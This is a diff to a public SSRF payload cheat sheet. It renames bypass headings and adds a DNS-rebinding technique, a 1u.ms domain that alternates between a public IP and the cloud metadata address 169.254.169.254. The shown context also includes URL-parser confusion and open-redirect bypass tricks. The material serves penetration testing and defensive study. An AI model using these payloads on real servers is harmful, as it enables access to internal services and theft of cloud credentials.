@@ -221,7 +221,7 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/SSRF_Parser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
-### Bypassing using other tricks
+### Bypassing using a redirect
 [using a redirect](https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection)
 
 ```powershell
@@ -230,12 +230,20 @@ http://127.1.1.1:80#\@127.2.2.2:80/
 vulnerable.com will fetch YOUR_SERVER_IP which will redirect to 192.168.0.1
 ```
 
-Using type=url
+### Bypassing using type=url
 
 ```powershell
 Change "type=file" to "type=url"
 Paste URL in text field and hit enter
 Using this vulnerability users can upload images from any image URL = trigger an SSRF
+```
+
+### Bypassing using DNS Rebinding (TOCTOU)
+
+```powershell
+Create a domain that change between two IPs. http://1u.ms/ exists for this purpose.
+For example to rotate between 1.2.3.4 and 169.254-169.254, use the following domain:
+make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 ```
 
 ## SSRF exploitation via URL Scheme
